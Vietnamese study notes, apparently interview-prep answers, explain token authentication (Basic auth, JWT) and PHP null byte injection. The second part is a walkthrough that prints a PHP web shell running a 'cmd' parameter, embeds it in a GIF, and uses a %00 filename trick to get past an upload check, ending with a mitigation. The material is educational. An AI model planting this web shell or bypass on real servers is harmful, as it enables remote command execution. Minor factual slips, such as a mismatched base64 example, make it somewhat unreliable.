# Question 5: What is token impersonation?
## Về token:
   - Đối với mô hình kiến trúc Restfull API hiện nay, việc sử dụng đơn thuần `username/password` để xác thực người dùng là thiếu an toàn. Vì với mô hình này sever không còn quản lý, nhận dạng client thông qua `seasion` nữa. Ví dụ như ta có 1 api dùng để xóa bài viết của người dùng như sau:
       ```
       DELETE: https://example.com/api/posts/2
       ```
   - Api này dùng để xóa bài viết có id = 2. Kẻ tấn công chỉ cần đơn giản sử dụng api này để xóa bài viết với id tùy ý. Vậy nên để bảo vệ các api thì người ta sẽ sử dụng token đối với mỗi api để bảo vệ api khỏi việc bị truy cập trái phép.
   - Mỗi khi client gọi 1 api nào đó trên server thì sẽ phải gửi kèm 1 thông tin nào đó dùng để xác thực với server gọi là token.
 ## Một số loại xác thực sử dụng token thông dụng
 #### Basic authention
 - Đây là một kiểu xác thực cơ bản. Ở kiểu xác thực này `username/password` sẽ được gửi kèm theo header mỗi khi client gọi api đến server.
- `username/password` được mã hóa bằng base64. Ví dụ với người dùng `user1` có mật khẩu là `123456` thì sẽ được mã hóa và gửi kèm trong `request header` như sau:
   
   ```Authorization: Basic dXNlcjE6MTIzNDU2Nzg=```
 - Server mỗi khi nhận request sẽ `decode`( giải mã) token này và tìm trong `database` để xác thực người dùng.
 - Với kiểu xác thực này nền sử dụng với giao thức `https` để tăng cường tính bảo mật cho api và tránh bị chặn bắt gói tin và giải mã trên đường truyền.
 #### Json web token (jwt)
 - Ở kiểu xác thực này cũng có nguyên tắc cơ bản tương tự như basic auth: 
     - Người dùng sẽ gửi username và password lên server, sau đó server sẽ xác thực và sinh ra cho client 1 đoạn string gọi là `jwt` (json web token). 
      - Từ đó mỗi lần gọi đến api thì người dùng sẽ gửi kèm `jwt` để server xác thực.
    - Quá trình này được mô tả như sau:
    
    Client application                                            API
    --------                                              -----------
       |                                                      |
        |                      GET /api/post                   |
        |----------------------------------------------------->|
        |                     403 Forbidden                    |
        |<-----------------------------------------------------|
        |                                                      |
        |                                                      |
        |                 POST /api/authenticate               |
        |     { login: "user2", password: "12345678" }         |
        |----------------------------------------------------->|
        |                      200 Success                     |
        |             { token: "my.personal.token" }           |
        |<-----------------------------------------------------|
        |                                                      |
        |                                                      |
        |                 GET /api/employees                   |
        | Header { "Authorization: Bearer "my.personal.token" }|
        |----------------------------------------------------->|
        |                      200 Success                     |
        |<-----------------------------------------------------|
        |                                                      |
        
- Ngoài việc để xác thực người dùng `jwt` còn dùng để làm 1 số việc khác như:
    -  Tạo các liên kết ngắn hạn như xác thực mail, xác thực thông tin đăng ký.
    -  Cho phép người dùng truy cập tài nguyên nhưng muốn hạn chế một số các tính năng, hạn chế 1 số tài nguyên: Ta có thể thêm luôn thông tin quyền truy cập vào `jwt` để phân quyền, giới hạn quyền một cách đơn giản và xây dựng hệ thống xác thực với mỗi `jwt` khác nhau thì người dùng có các quyền truy cập khác nhau.
# Question 6: Describe when you would use a null byte during an application penetration test?
 - Khi lập trình đôi lúc chúng ta hay gặp phải lỗi `null pointer exception` , hay một số ngôn ngữ có khác niệm như `null` hay `nonce`. Khái niệm `null` ở đây chính là không có gì không tồn tại và nó cũng hoàn toàn khác với giá trị `0` hay `false`.
 - Thuật ngữ `null byte` ở đây cũng tương tự vậy. Nó không có và cũng không tồn tại dữ liệu gì cả
 ### Null byte injection trong php
 - Trong rất nhiểu loại bảng mã thông dụng ví dụ như bảng mã ASCII, Unicode ,EBCDIC,.. Hay cũng như trong các ngôn ngữ lập trình như c, c++, python, java, php,.. đều có kí tự này trong `character set`.
 - Và có một lỗ hổng giúp ta vượt qua `null character` trong url gọi là `Null byte injection`. Trong url, `null character` được mã hóa thành `%00`.
 - Sau đây mình sẽ dựng một kịch bản tấn công web php với lỗ hổng `null byte injection` này:
  #### Kịch bản:
  Ở đây ta có một website cho phép user có thể upload ảnh lên trang web và tên file có thể được tùy biến bởi người dùng. Phía server sẽ có 1 vài xác thực lại ảnh mà người dùng upload lên ví dụ: chỉ cho phép Upload gif file,... Đây là đoạn source code upload file:
  ![](https://images.viblo.asia/6c24bd17-c9c4-410f-a951-0a5b0a329ed6.png)
  
  - Ta phân tích các dòng code dùng trong ảnh:
    1. Tạo biến `allowed` với mảng giá trị `GIF`
    2. Lấy biến `name` là tên của file ảnh mà user upload lên từ POST request. và dùng hàm `explode` để cắt tên file ra
    3. Ở dòng này server dùng hàm `end` để trả về phần mở rộng của `filename` và đẩy vào biến `fileExtension`
    4. Sử dụng hàm `getimagesize` để kiếm tra và đảm bảo file upload lên của user là file `GIF`. 
    5. Nếu điều kiện được thỏa mãn thì file sẽ được upload lên  thư mục với tên file của user đặt ở `dòng 6`. Nếu không đảm bảo điều kiện thì sẽ in ra lỗi.
- Phân tích đoạn chương trình trên ta có thể thấy rằng chỉ các tệp hình ảnh có phần mở rộng là GIF thì mới được phép upload trên server. Nếu tệp có phần mở rộng khác với GIF thì server sẽ không cho phép tải tệp lên máy chủ.
- Bằng việc sử dụng lỗ hổng `null byte injection` ta có thể đẩy mã độc lên máy chủ. Ta sẽ thực hiện bằng cách sau:
    1. Ta tạo 1 tệp mã độc php như sau:
        ```php
        <?php
            if(isset($_REQUEST['cmd'])){
                    $cmd = ($_REQUEST["cmd"]);
                    system($cmd);
                    echo "</pre>$cmd<pre>";
                    die;
            }
        ?>
        ```

- Đoạn mã này sẽ nhận tham số `cmd` từ request và chạy lệnh này và trả kết quả về cho kẻ tấn công.

    2. Ta tiếp tục tải 1 tệp GIF bất kì từ trên mạng về và ta sẽ dùng tool `Gifsicle` trên linux để chèn mã độc vào tệp này. Ta sử dụng lệnh:

        ``gifsicle –comment “`tr ‘\n’ ‘ ‘ < simple-backdoor.php`” < photo.gif`` 

        để thực hiện việc này. Hoặc đối với các bạn sử dụng window ta có thể dùng lệnh:

        ``copy photo.gif/b + simple-backdoor.php result.gif`` 

    3. Sau khi có được file result.gif này mà ta chỉ upload theo kiểu bình thường thì mã độc sẽ không thể thực thi do tệp tin có đuôi là `.GIF`. Ta sẽ phải dùng tool để sửa đổi tên file và chèn `null byte` vào tên file để có thể lưu vào server với đuôi là .php và mà vẫn được server chấp nhận.
    4. Ta sử dụng công cụ `Burp suite`:
    ![](https://images.viblo.asia/5e276a4d-62d8-42d7-8b4b-b085464f7345.png)
    Ta thấy rằng phần số 3 chính là dữ liệu byte của file ta upload lên. Trong đó có cả mã độc mà ta chèn vào file ảnh. Bây giờ ta sẽ đổi file thành 1 tên gì đó kiểu như `image.php.gif`. Sau đó chuyển sang `tab hex` ta sẽ chèn thêm 1 byte `00` vào giữa tên file `img.php` và `.gif` :
    ![](https://images.viblo.asia/ffc88fdf-8db8-4070-adf9-1b20deb42e07.png)
sau đó forward request đi. Ta thu được kết quả là mã độc đã được chèn lên server.
### Tổng kết:
- Ta có thể thấy rằng `null byte injection` là một lỗ hổng nguy hiểm trong PHP. Việc khai thác được lỗ hổng này làm cho hacker có thể kiếm soát được hệ thống. Để sửa được lỗi này thì ta cần kiểm tra kĩ các dữ liệu được input từ người dùng. Ta có thể dùng đoạn mã sau để bỏ đi tất cả các `null byted` được chèn vào dữ liệu đẩy lên.
    ```php
    $input = str_replace(chr(0), '', $input);
    ```